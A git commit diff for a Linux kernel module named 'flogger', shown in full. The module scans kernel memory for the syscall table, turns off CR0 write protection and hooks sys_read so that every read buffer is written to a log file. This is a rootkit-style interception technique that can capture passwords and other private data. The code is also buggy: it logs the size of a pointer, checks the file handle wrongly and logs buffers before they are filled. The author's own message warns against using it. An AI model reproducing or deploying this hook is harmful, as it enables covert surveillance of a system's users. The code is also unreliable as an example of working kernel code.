7d78e48582db35f2dc667197cd62d0f406e13a0b
CurtisFielding <fieldic@hotmail.com>
2014-10-30 20:37:57 -0700

    OH GOD dont use this module right now. added get_sys_call_table

--- flogger.c
+++ flogger.c
@@ -5,67 +5,40 @@
 #include <linux/file.h>
 #include <linux/fs.h>
 #include <linux/fcntl.h>
-/* #include <asm/cacheflush.h> */
 #include <asm/uaccess.h>
-/* #include <asm/syscall.h> */
 
+unsigned long **sys_call_table;
 
-
-void  **sys_call_table[];
 asmlinkage size_t (*og_sys_read)(int filedes, void *buf, size_t bytes);
 
 static void floglog(char *filename, char *data)
 {
   struct file *file;
-  int fd;
   loff_t pos = 0;
 
   mm_segment_t old_fs = get_fs();
   set_fs(KERNEL_DS);
 
-  fd = filp_open(filename, O_WRONLY|O_CREAT|O_APPEND, 0644);
-  if (fd >= 0) {
-    /* sys_write(fd, data, strlen(data)); */
-    file = fget(fd);
-    if (file) {
-      vfs_write(file, data, strlen(data), &pos);
-      fput(file);
-    }
-    sys_close(fd);
+  file = filp_open(filename, O_WRONLY|O_CREAT|O_APPEND, 0644);
+  if (file) {
+    vfs_write(file, data, sizeof(data), &pos);
   }
+  filp_close(file, NULL);
   set_fs(old_fs);
 }
 
 asmlinkage size_t flog_read(int filedes, void *buf, size_t bytes)
 {
-  char *flogf = "/usr/var/flogfile.log";
-  printk("it\'s flogging time!\n");
+  char *flogf = "/var/flogfile.log";
+  printk("flogger: read call\n");
   floglog(flogf, buf);
   return og_sys_read(filedes, buf, bytes);
 }
 
-/* NOTE: this is depreciated, use alt method for */
-/* disabling page write protection */
-/* int set_pg_rw(long unsigned int addr) */
-/* { */
-/*   struct page *pg; */
-/*   pgprot_t prot; */
-/*   pg = virt_to_page(addr); */
-/*   prot.pgprot = VM_READ | VM_WRITE; */
-/*   return change_page_attr(pg, 1, prot); */
-/* } */
-
-/* int set_pg_ro(long unsigned int addr) */
-/* { */
-/*   struct page *pg; */
-/*   pgprot_t prot; */
-/*   pg = virt_to_page(addr); */
-/*   prot.pgprot = VM_READ; */
-/*   return change_page_attr(pg, 1, prot); */
-/* } */
-
-static void dsbl_pg_prot(void) {
+static void dsbl_pg_prot(void)
+{
   unsigned long pgval;
+  printk("flogger: disablig page protection\n");
   asm volatile("mov %%cr0, %0" 
 	       :"=r" (pgval));
   if (pgval & 0x00010000) {
@@ -76,8 +49,10 @@ static void dsbl_pg_prot(void) {
   }
 }
 
-static void enbl_pg_prot(void) {
+static void enbl_pg_prot(void)
+{
   unsigned long pgval;
+  printk("flogger: enabling page protection\n");
   asm volatile("mov %%cr0, %0" 
 	       :"=r" (pgval));
   if (!(pgval & 0x00010000)) {
@@ -88,19 +63,45 @@ static void enbl_pg_prot(void) {
   }
 }
 
-int init_module()
+static unsigned long **get_sys_call_table(void)
 {
+  unsigned long **sct;
+  unsigned long int offset = PAGE_OFFSET;
+
+  while (offset < ULONG_MAX) {
+    sct = (unsigned long **) offset;
+    
+    if (sct[__NR_close] == (unsigned long *) sys_close) {
+      printk("flogger: found sys_call_table at %p\n", sct);
+      return sct;
+    }
+
+    offset += sizeof(void *);
+  }
+
+  return NULL;
+}
+
+int init_module(void)
+{
+  sys_call_table = get_sys_call_table();
+  if (sys_call_table == NULL)
+    return -1;
+
   dsbl_pg_prot();
   og_sys_read = sys_call_table[__NR_read];
   sys_call_table[__NR_read] = flog_read;
   enbl_pg_prot();
+  printk("it\'s flogging time!\n");
   return 0;
 }
 
-void cleanup_module()
+void cleanup_module(void)
 {
   dsbl_pg_prot();
   sys_call_table[__NR_read] = og_sys_read;
   enbl_pg_prot();
   printk("done flogging!\n");
 }
+
+MODULE_LICENSE("GPL");
